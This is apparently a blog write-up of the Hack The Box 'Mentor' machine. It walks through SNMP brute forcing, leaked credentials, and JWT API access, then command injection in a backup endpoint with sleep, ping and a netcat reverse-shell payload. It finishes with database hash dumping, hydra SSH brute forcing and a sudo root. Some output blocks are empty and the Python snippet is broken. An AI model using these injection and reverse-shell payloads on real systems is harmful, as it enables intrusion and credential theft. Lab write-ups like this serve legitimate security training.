# Initial Setup and 

## Setup
```bash
export target=10.10.11.193
cp /etc/hosts .
```

This will define a variable so we don't need to remember the IP address. Copying `/etc/hosts` to the directory will also allow us to keep track of hosts and subdomains, this is helpful for going back to machines as all the information is kept in the directory and copied to `/etc/hosts` when needed.

# Enumeration

Alrighty let's get cracking! Starting with an `nmap`:
```bash
nmap -p- -sCV -oN scans/nmap_full -v $target
```

Output:
```bash

The key takeaways from above are:
- Appears to be a Linux box.
- Hosting a web server on `80` with the domain name `mentorquotes.htb`
- `SNMP` is being served

My `/etc/hosts` file now looks like:
```bash
127.0.0.1       localhost
127.0.1.1       kali

10.10.11.193    mentorquotes.htb
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

## Obtaining user.txt
### Website
Upon viewing the website hosted on port `80` we are given a generic looking quote website:
![alt text](/assets/images/17-12-2024/mentor/website.png "Quote Site")
In typical HTB fashion whenever you get a subdomain rather than just an IP address its a good idea to fuzz it!
```bash
ffuf -w ~/Lists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://mentorquotes.htb -H "Host: FUZZ.mentorquotes.htb" -mc all --fw 18
```
Output:
![alt text](/assets/images/17-12-2024/mentor/ffuf.png "ffuf Output")

Lovely let's add `api.mentorquotes.htb` to the hosts file. 
Visiting the site, we're presented with a plain:
```json
{"detail":"Not Found"}
```
Using `dirsearch` we get a better view of the api subdomain.
```bash
dirsearch -u http://api.mentorquotes.htb -o scans/dirsearch_api
```
Output:
```

`http://api.mentorquotes.htb/redoc` presents us with various API calls and the username `james`.

![alt text](/assets/images/17-12-2024/mentor/redoc.png "ffuf Output")

It would appear the calls require an `Authorization` header, which is likely returned after calling `/auth/login`. However, we don't have any credentials... yet.

### SNMP

As we saw earlier `SNMP` is listening on the host. Using the default community string `PUBLIC` doesn't return anything of any use currently.
We can try and bruteforce more community strings using `snmpbrute`

```bash
python3 snmpbrute.py -t $target
```

`snmpbrute` identifies the community string `internal` using snmp v2c. Let's have a gander:
```bash
snmpwalk -v 2c -c internal $target -m all
```

This outputs a lot of OIDs and information so after saving to a file I scoured over it.

First searching for flags that may be in CLI arguments such as `script.sh --username foo --password hellothere`:
```bash
grep "\-\-" scans/snmp-walk_internal
```
Output:
![alt text](/assets/images/17-12-2024/mentor/grep_1.png "grep 1")

Having installed the MIBS the OIDS are translated and we can see a name that contains "RunParameters". Let's grep for those:
```bash
grep -i "RunParam" scans/snmp-walk_internal
```
Output:
![alt text](/assets/images/17-12-2024/mentor/grep_2.png "grep 2")

Looks like a password to me!

### Back to the API we go
Using the information from the `/redoc` page we can assemble a `HTTP` `POST` request to attempt to log in:
```http
POST /auth/login HTTP/1.1
Host: api.mentorquotes.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Content-Type: application/json
Content-Length: 104

{
  "email": "james@mentorquotes.htb",
  "username": "james",
  "password": "kj23sadkj123as0-d213"
}
```

This returns a `200 OK` and we are presented with a JWT!
![alt text](/assets/images/17-12-2024/mentor/resp.png "Response")

Let's now try and use this JWT to query an endpoint that requires authorisation:
```http
GET /users/1/ HTTP/1.1
Host: api.mentorquotes.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0
```

This works a treat and we are presented with `james`' information. Change the `1` to a `2` gives us a username of `svc`:
![alt text](/assets/images/17-12-2024/mentor/svc.png "svc user")

Previously `dirsearch` found some endpoints that aren't in the `/redoc` documentation:
```
422   186B   http://api.mentorquotes.htb/admin/
405    31B   http://api.mentorquotes.htb/admin/backup
```

Trying to access `/admin` with authorization header we get the response:

![alt text](/assets/images/17-12-2024/mentor/admin_1.png "api admin")

`/check` returns:
```json
{"details":"Not implemented yet!"}
```

However `/backup` provides appears to be implemented. Missing around with variables etc and sending:
```http
POST /admin/backup HTTP/1.1
Host: api.mentorquotes.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0
Content-Type: application/json
Content-Length: 24

{
  "test": "/test"
}
```
Response:

![alt text](/assets/images/17-12-2024/mentor/resp_2.png "resp 2")

This essentially tells us to use a variable in the body called `path`. Changing the request to:
```http
POST /admin/backup HTTP/1.1
Host: api.mentorquotes.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0
Content-Type: application/json
Content-Length: 29

{
  "path": "/etc/passwd"
}
```
We are provided with a `200 OK`:
```json
{"INFO":"Done!"}
```

Fuzzing `Path` it was identified it is vulnerable to command injection. The following request takes around 5 seconds to return:
```json
{
    "path": ";sleep 5;"
}
```
Response Time:

![alt text](/assets/images/17-12-2024/mentor/sleep.png "sleep")

Changing the sleep time also affects the response time, the next step is to test `ICMP`:
On my host:

```
sudo tcpdump -i tun0 icmp
```

Then send:
```json
{
    "path": ";ping -c 5 10.10.14.18;"
}
```
Output:

![alt text](/assets/images/17-12-2024/mentor/icmp.png "ICMP")

Lovely! Last step is to try for a reverse shell:
```json
{
    "path": ";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.18 5555 >/tmp/f;"
}
```
![alt text](/assets/images/17-12-2024/mentor/shell_docker.png "Docker Shell")

Cracking job, from here we can get `user.txt` in `/home/svc`
## Obtaining root.txt
### Out the Blowhole

Some enumeration of the host we identify this is a docker instance, primarily by the presence of `/.dockerenv`... kinda a big give away.

Reading over the files for the web application we come across `db.py`. Sometimes config or database files contain credentials. However, in this case it does not, though not all is lost.
There are multiple ways to attempt to access this Postgres instance, I took a boring approach and simply re-jigged the python file to read the database instead of creatng/writing. The code is at the end of this page.

Uploading this file to the web server and running we are presented with:
![alt text](/assets/images/17-12-2024/mentor/hashes.png "Database Hashes")

This appear to be `MD5` hashes and crackstation comes up trumps with `svc`s' hash:
```
123meunomeeivani
```
Compiling a list of usernames and passwords we have so far let's use `hydra` to attempt to get a valid pair:
```bash
hydra -L users -P passwords  ssh://$target
```
Output:
```bash
[..SNIP..]
[22][ssh] host: 10.10.11.193   login: svc   password: 123meunomeeivani
[..SNIP..]
```

We now have SSH access to the target as the user `svc`. 

### svc to james

After some enumeration it's identified that `svc` can read `SNMP` config files in `/etc/snmp`. As this was a part of the initial access it was a good place to check once I gained a foothold.
Once again a plaintext password is disclosed!:

![alt text](/assets/images/17-12-2024/mentor/james_pw.png "Jame's Password")

Running `hydra` again I was given the output:
```bash
[..SNIP..]
[22][ssh] host: 10.10.11.193   login: james   password: SuperSecurePassword123__
[..SNIP..]
```
(You can also just `su` to `james`)

Now I have access to a new user the classic check is always `sudo -l` anddddddddd:

![alt text](/assets/images/17-12-2024/mentor/sudo.png "sudo")


Yep... thats very lame, oh well now we have root.
```bash
sudo /bin/sh
```

![alt text](/assets/images/17-12-2024/mentor/lame.gif "lame")






## TLDR
- Sub domain enumeration gives us `api.mentorquotes.htb`
- `SNMP` community string `Internal` gives us password for above api
- API call at `/admin/backup` has OS injection vuln
- Dump `svc`s' password from database
- Login via ssh as `svc`
- Get `james`' password from `SNMP` config file
- Login as `james`, easy peasy `sudo -l`




## Read Database python:
```python
from sqlalchemy import create_engine, Table, Column, Integer, String, MetaData, select

DATABASE_URL = "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db"

metadata = MetaData()

    metadata,
    Column("id", Integer, primary_key=True),
    Column("email", String(50)),
    Column("username", String(50)),
    Column("password", String(128), nullable=False),
)

engine = create_engine(DATABASE_URL)

def fetch_all_users():
    with engine.connect() as connection:
        query = select(users)
        results = connection.execute(query)
        return results.fetchall()

if __name__ == "__main__":
    users = fetch_all_users()
    for user in users:
        print(f"ID: {user.id}, Email: {user.email}, Username: {user.username}, Password: {user.password}")
